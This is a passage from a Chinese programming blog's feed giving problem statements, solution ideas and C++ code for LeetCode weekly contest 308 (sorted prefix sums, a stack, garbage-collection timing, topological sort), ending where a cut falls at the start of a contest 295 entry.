kind;</span><br><span class="line">                    cnt += j - i;</span><br><span class="line">                &#125;</span><br><span class="line">                state[j - <span class="number">1</span>]--;</span><br><span class="line">            &#125;</span><br><span class="line">            ret = (ret + <span class="number">1</span>) * kind / cnt;</span><br><span class="line">            memo[state] = ret;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dfs</span>(curr, total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  weekly contest 308</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/29/</url>
    <content><![CDATA[<h2 id="leetcode-weekly-contest-308"><a href="#leetcode-weekly-contest-308" class="headerlink" title="leetcode  weekly contest 308"></a>leetcode  weekly contest 308</h2><p>竞赛手速场了，没啥好说的，都是常规题目。</p>
<h4 id="6160-和有限的最长子序列"><a href="#6160-和有限的最长子序列" class="headerlink" title="6160. 和有限的最长子序列"></a>6160. 和有限的最长子序列</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个长度为 <code>n</code> 的整数数组 <code>nums</code> ，和一个长度为 <code>m</code> 的整数数组 <code>queries</code> 。</p>
<p>返回一个长度为 <code>m</code> 的数组 <code>answer</code> ，其中 <code>answer[i]</code> 是 <code>nums</code> 中 元素之和小于等于 <code>queries[i]</code> 的 <strong>子序列</strong> 的 <strong>最大</strong> 长度 。</p>
<p><strong>子序列</strong> 是由一个数组删除某些元素（也可以不删除）但不改变剩余元素顺序得到的一个数组。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,5,2,1], queries = [3,10,21]</span><br><span class="line">输出：[2,3,4]</span><br><span class="line">解释：queries 对应的 answer 如下：</span><br><span class="line">- 子序列 [2,1] 的和小于或等于 3 。可以证明满足题目要求的子序列的最大长度是 2 ，所以 answer[0] = 2 。</span><br><span class="line">- 子序列 [4,5,1] 的和小于或等于 10 。可以证明满足题目要求的子序列的最大长度是 3 ，所以 answer[1] = 3 。</span><br><span class="line">- 子序列 [4,5,2,1] 的和小于或等于 21 。可以证明满足题目要求的子序列的最大长度是 4 ，所以 answer[2] = 4 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,3,4,5], queries = [1]</span><br><span class="line">输出：[0]</span><br><span class="line">解释：空子序列是唯一一个满足元素和小于或等于 1 的子序列，所以 answer[0] = 0 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == nums.length</code></li>
<li><code>m == queries.length</code></li>
<li><code>1 &lt;= n, m &lt;= 1000</code></li>
<li><code>1 &lt;= nums[i], queries[i] &lt;= 106</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-308/problems/longest-subsequence-with-limited-sum/">https://leetcode.cn/contest/weekly-contest-308/problems/longest-subsequence-with-limited-sum/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心算法
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目太简单了，由于不需要子序列有序，就非常简单了，直接将数组 $nums$ 排序，长度为 $i$ 的子序列的最小和即为前 $i$ 项元素的和，我们依次贪心的尝试前 $i$ 项的和小于等于 $queries[i]$ 的最大 $i$ 即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n \log n)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">answerQueries</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> m = queries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(m)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">minSum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            minSum[i+<span class="number">1</span>] = minSum[i] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> j = n; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">               <span class="keyword">if</span> (minSum[j] &lt;= queries[i]) &#123;</span><br><span class="line">                   ans[i] = j;</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6161-从字符串中移除星号"><a href="#6161-从字符串中移除星号" class="headerlink" title="6161. 从字符串中移除星号"></a>6161. 从字符串中移除星号</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个包含若干星号 <code>*</code> 的字符串 <code>s</code> 。</p>
<p>在一步操作中，你可以：</p>
<ul>
<li>选中 <code>s</code> 中的一个星号。</li>
<li>移除星号 <strong>左侧</strong> 最近的那个 <strong>非星号</strong> 字符，并移除该星号自身。</li>
</ul>
<p>返回移除 <strong>所有</strong> 星号之后的字符串<strong>。</strong></p>
<p><strong>注意：</strong></p>
<ul>
<li>生成的输入保证总是可以执行题面中描述的操作。</li>
<li>可以证明结果字符串是唯一的。</li>
</ul>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;leet**cod*e&quot;</span><br><span class="line">输出：&quot;lecoe&quot;</span><br><span class="line">解释：从左到右执行移除操作：</span><br><span class="line">- 距离第 1 个星号最近的字符是 &quot;leet**cod*e&quot; 中的 &#x27;t&#x27; ，s 变为 &quot;lee*cod*e&quot; 。</span><br><span class="line">- 距离第 2 个星号最近的字符是 &quot;lee*cod*e&quot; 中的 &#x27;e&#x27; ，s 变为 &quot;lecod*e&quot; 。</span><br><span class="line">- 距离第 3 个星号最近的字符是 &quot;lecod*e&quot; 中的 &#x27;d&#x27; ，s 变为 &quot;lecoe&quot; 。</span><br><span class="line">不存在其他星号，返回 &quot;lecoe&quot; 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;erase*****&quot;</span><br><span class="line">输出：&quot;&quot;</span><br><span class="line">解释：整个字符串都会被移除，所以返回空字符串。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 105</code></li>
<li><code>s</code> 由小写英文字母和星号 <code>*</code> 组成</li>
<li><code>s</code> 可以执行上述操作</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-308/problems/removing-stars-from-a-string/">https://leetcode.cn/contest/weekly-contest-308/problems/removing-stars-from-a-string/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>栈
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>跟左右括号匹配一个原理，无脑用栈求解即可，与到 <code>*</code> 从栈中弹出一个元素即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示字符串的长度。</li>
<li>空间复杂度：时间复杂度为 $O(n)$，$n$ 表示字符串的长度。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">removeStars</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c : s) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                ans.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ans.<span class="built_in">push_back</span>(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6162-收集垃圾的最少总时间"><a href="#6162-收集垃圾的最少总时间" class="headerlink" title="6162. 收集垃圾的最少总时间"></a>6162. 收集垃圾的最少总时间</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <strong>0</strong> 开始的字符串数组 <code>garbage</code> ，其中 <code>garbage[i]</code> 表示第 <code>i</code> 个房子的垃圾集合。<code>garbage[i]</code> 只包含字符 <code>&#39;M&#39;</code> ，<code>&#39;P&#39;</code> 和 <code>&#39;G&#39;</code> ，但可能包含多个相同字符，每个字符分别表示一单位的金属、纸和玻璃。垃圾车收拾 <strong>一</strong> 单位的任何一种垃圾都需要花费 <code>1</code> 分钟。</p>
<p>同时给你一个下标从 <strong>0</strong> 开始的整数数组 <code>travel</code> ，其中 <code>travel[i]</code> 是垃圾车从房子 <code>i</code> 行驶到房子 <code>i + 1</code> 需要的分钟数。</p>
<p>城市里总共有三辆垃圾车，分别收拾三种垃圾。每辆垃圾车都从房子 <code>0</code> 出发，<strong>按顺序</strong> 到达每一栋房子。但它们 <strong>不是必须</strong> 到达所有的房子。</p>
<p>任何时刻只有 <strong>一辆</strong> 垃圾车处在使用状态。当一辆垃圾车在行驶或者收拾垃圾的时候，另外两辆车 <strong>不能</strong> 做任何事情。</p>
<p>请你返回收拾完所有垃圾需要花费的 <strong>最少</strong> 总分钟数。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：garbage = [&quot;G&quot;,&quot;P&quot;,&quot;GP&quot;,&quot;GG&quot;], travel = [2,4,3]</span><br><span class="line">输出：21</span><br><span class="line">解释：</span><br><span class="line">收拾纸的垃圾车：</span><br><span class="line">1. 从房子 0 行驶到房子 1</span><br><span class="line">2. 收拾房子 1 的纸垃圾</span><br><span class="line">3. 从房子 1 行驶到房子 2</span><br><span class="line">4. 收拾房子 2 的纸垃圾</span><br><span class="line">收拾纸的垃圾车总共花费 8 分钟收拾完所有的纸垃圾。</span><br><span class="line">收拾玻璃的垃圾车：</span><br><span class="line">1. 收拾房子 0 的玻璃垃圾</span><br><span class="line">2. 从房子 0 行驶到房子 1</span><br><span class="line">3. 从房子 1 行驶到房子 2</span><br><span class="line">4. 收拾房子 2 的玻璃垃圾</span><br><span class="line">5. 从房子 2 行驶到房子 3</span><br><span class="line">6. 收拾房子 3 的玻璃垃圾</span><br><span class="line">收拾玻璃的垃圾车总共花费 13 分钟收拾完所有的玻璃垃圾。</span><br><span class="line">由于没有金属垃圾，收拾金属的垃圾车不需要花费任何时间。</span><br><span class="line">所以总共花费 8 + 13 = 21 分钟收拾完所有垃圾。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：garbage = [&quot;MMM&quot;,&quot;PGM&quot;,&quot;GP&quot;], travel = [3,10]</span><br><span class="line">输出：37</span><br><span class="line">解释：</span><br><span class="line">收拾金属的垃圾车花费 7 分钟收拾完所有的金属垃圾。</span><br><span class="line">收拾纸的垃圾车花费 15 分钟收拾完所有的纸垃圾。</span><br><span class="line">收拾玻璃的垃圾车花费 15 分钟收拾完所有的玻璃垃圾。</span><br><span class="line">总共花费 7 + 15 + 15 = 37 分钟收拾完所有的垃圾。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= garbage.length &lt;= 105</code></li>
<li><code>garbage[i]</code> 只包含字母 <code>&#39;M&#39;</code> ，<code>&#39;P&#39;</code> 和 <code>&#39;G&#39;</code> 。</li>
<li><code>1 &lt;= garbage[i].length &lt;= 10</code></li>
<li><code>travel.length == garbage.length - 1</code></li>
<li><code>1 &lt;= travel[i] &lt;= 100</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-308/problems/minimum-amount-of-time-to-collect-garbage/">https://leetcode.cn/contest/weekly-contest-308/problems/minimum-amount-of-time-to-collect-garbage/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目出的非常奇怪，不知道想考什么，由于任何时间只有一辆车辆可以行动，所以根本不能在最优调动什么的，直接暴力计算每种垃圾车的运行的最短时间即可，稍微有点技巧的是需要注意到垃圾车不必走到最后一栋房子，只需要清理完最后一栋含有该垃圾的房子即可停止即可。</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为节点数目。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 为节点数目。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">garbageCollection</span><span class="params">(vector&lt;string&gt;&amp; garbage, vector&lt;<span class="type">int</span>&gt;&amp; travel)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = garbage.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">cnt</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">3</span>));</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">last</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> c : garbage[i]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">                    cnt[i][<span class="number">0</span>]++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">&#x27;P&#x27;</span>) &#123;</span><br><span class="line">                    cnt[i][<span class="number">1</span>]++;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;G&#x27;</span>) &#123;</span><br><span class="line">                    cnt[i][<span class="number">2</span>]++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt[i][j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    last[j] = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cost</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n &amp;&amp; j &lt;= last[i]; j++) &#123;</span><br><span class="line">                cost[i] += cnt[j][i];</span><br><span class="line">                <span class="keyword">if</span> (j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    cost[i] += travel[j - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cost[<span class="number">0</span>] + cost[<span class="number">1</span>] + cost[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6163-给定条件下构造矩阵"><a href="#6163-给定条件下构造矩阵" class="headerlink" title="6163. 给定条件下构造矩阵"></a>6163. 给定条件下构造矩阵</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个 <strong>正</strong> 整数 <code>k</code> ，同时给你：</p>
<ul>
<li>一个大小为 <code>n</code> 的二维整数数组 <code>rowConditions</code> ，其中 <code>rowConditions[i] = [abovei, belowi]</code> 和</li>
<li>一个大小为 <code>m</code> 的二维整数数组 <code>colConditions</code> ，其中 <code>colConditions[i] = [lefti, righti]</code> 。</li>
</ul>
<p>两个数组里的整数都是 <code>1</code> 到 <code>k</code> 之间的数字。</p>
<p>你需要构造一个 <code>k x k</code> 的矩阵，<code>1</code> 到 <code>k</code> 每个数字需要 <strong>恰好出现一次</strong> 。剩余的数字都是 <code>0</code> 。</p>
<p>矩阵还需要满足以下条件：</p>
<ul>
<li>对于所有 <code>0</code> 到 <code>n - 1</code> 之间的下标 <code>i</code> ，数字 <code>abovei</code> 所在的 <strong>行</strong> 必须在数字 <code>belowi</code> 所在行的上面。</li>
<li>对于所有 <code>0</code> 到 <code>m - 1</code> 之间的下标 <code>i</code> ，数字 <code>lefti</code> 所在的 <strong>列</strong> 必须在数字 <code>righti</code> 所在列的左边。</li>
</ul>
<p>返回满足上述要求的 <strong>任意</strong> 矩阵。如果不存在答案，返回一个空的矩阵。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/07/06/gridosdrawio.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：k = 3, rowConditions = [[1,2],[3,2]], colConditions = [[2,1],[3,2]]</span><br><span class="line">输出：[[3,0,0],[0,0,1],[0,2,0]]</span><br><span class="line">解释：上图为一个符合所有条件的矩阵。</span><br><span class="line">行要求如下：</span><br><span class="line">- 数字 1 在第 1 行，数字 2 在第 2 行，1 在 2 的上面。</span><br><span class="line">- 数字 3 在第 0 行，数字 2 在第 2 行，3 在 2 的上面。</span><br><span class="line">列要求如下：</span><br><span class="line">- 数字 2 在第 1 列，数字 1 在第 2 列，2 在 1 的左边。</span><br><span class="line">- 数字 3 在第 0 列，数字 2 在第 1 列，3 在 2 的左边。</span><br><span class="line">注意，可能有多种正确的答案。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：k = 3, rowConditions = [[1,2],[2,3],[3,1],[2,3]], colConditions = [[2,1]]</span><br><span class="line">输出：[]</span><br><span class="line">解释：由前两个条件可以得到 3 在 1 的下面，但第三个条件是 3 在 1 的上面。</span><br><span class="line">没有符合条件的矩阵存在，所以我们返回空矩阵。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= k &lt;= 400</code></li>
<li><code>1 &lt;= rowConditions.length, colConditions.length &lt;= 104</code></li>
<li><code>rowConditions[i].length == colConditions[i].length == 2</code></li>
<li><code>1 &lt;= abovei, belowi, lefti, righti &lt;= k</code></li>
<li><code>abovei != belowi</code></li>
<li><code>lefti != righti</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-308/problems/build-a-matrix-with-conditions/">https://leetcode.cn/contest/weekly-contest-308/problems/build-a-matrix-with-conditions/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>拓扑排序
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单的拓扑排序即可，首先我们观察一下行的顺序与列的顺序是互相分离的，互相不影响的，因此我们可以先计算出每个元素所处的行的位置，再计算出每个元素所处的列的位置解，这样即可得到元素 $1, 2 , \cdots, k$ 的行坐标与列坐标。</li>
<li>行或者列的依赖关系我们可以转换为有向图，如果行 $x$ 在行 $y$ 的上方，则有有向变从 $x$ 指向 $y$，此时只需要求出所有行或者列的先后顺序即可，此时我们很容易的用拓扑排序求出即可，此时我们即求出元素 $1, 2 , \cdots, k$ 的行或者列的顺序，最后将元素写会矩阵即可。需要注意的是如果拓扑排序失败，则表明依赖关系存在矛盾，直接返回空矩阵即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m + k^2)$，其中 $m$ 表示依赖关系数组的长度，$k$ 表示给定的 $k$。</li>
<li>空间复杂度：$O(k + m)$，其中 $m$ 表示依赖关系数组的长度，$k$ 表示给定的 $k$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">bfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;adj, vector&lt;<span class="type">int</span>&gt; &amp;degree, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; qu;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (degree[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                qu.<span class="built_in">emplace</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ret;</span><br><span class="line">        <span class="keyword">while</span> (!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> curr = qu.<span class="built_in">front</span>();</span><br><span class="line">            qu.<span class="built_in">pop</span>();</span><br><span class="line">            ret.<span class="built_in">emplace_back</span>(curr);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> v : adj[curr]) &#123;</span><br><span class="line">                degree[v]--;</span><br><span class="line">                <span class="keyword">if</span> (degree[v] == <span class="number">0</span>) &#123;</span><br><span class="line">                    qu.<span class="built_in">emplace</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">buildMatrix</span>(<span class="type">int</span> k, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; rowConditions, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; colConditions) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adjRow</span>(k);</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adjCol</span>(k);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">indegreeRow</span><span class="params">(k, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">indegreeCol</span><span class="params">(k, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : rowConditions) &#123;</span><br><span class="line">            <span class="type">int</span> x = v[<span class="number">0</span>] - <span class="number">1</span>, y = v[<span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line">            adjRow[x].<span class="built_in">emplace_back</span>(y);</span><br><span class="line">            indegreeRow[y]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : colConditions) &#123;</span><br><span class="line">            <span class="type">int</span> x = v[<span class="number">0</span>] - <span class="number">1</span>, y = v[<span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line">            adjCol[x].<span class="built_in">emplace_back</span>(y);</span><br><span class="line">            indegreeCol[y]++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; rowIdx = <span class="built_in">bfs</span>(adjRow, indegreeRow, k);</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; colIdx = <span class="built_in">bfs</span>(adjCol, indegreeCol, k);</span><br><span class="line">        <span class="keyword">if</span> (rowIdx.<span class="built_in">size</span>() &lt; k || colIdx.<span class="built_in">size</span>() &lt; k) &#123;</span><br><span class="line">            <span class="keyword">return</span> vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">loc</span>(k, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            loc[rowIdx[i]][<span class="number">0</span>] = i;</span><br><span class="line">            loc[colIdx[i]][<span class="number">1</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">ans</span>(k, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(k));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = loc[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> y = loc[i][<span class="number">1</span>];</span><br><span class="line">            ans[x][y] = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 295</title>
    <url>/2022/01/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/3/</url>
    <content><![CDATA[<h2 id="leetcode-contest-295"><a href="#leetcode-contest-295" class="headerlink" title="leetcode contest 295"></a>leetcode contest 295</h2><p>第三题难度竟然超过第四题的难度。第四题确实是简单题目。</p>
<h3 id="2287-重排字符形成目标字符串"><a href="#2287-重排字符形成目标字符串" class="headerlink" title="2287. 重排字符形成目标字符串"></a>2287. 重排字符形成目标字符串</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你两个下标从 <code>0</code> 开始的字符串 <code>s</code> 和 <code>target</code> 。你可以从 s 取出一些字符并将其重排，得到若干新的字符串。</p>
<p>从 <code>s</code> 中取出字符并重新排列，返回可以形成 <code>target</code> 的 最大 副本数。</p>
<p> </p>
<p>示例 1：</p>
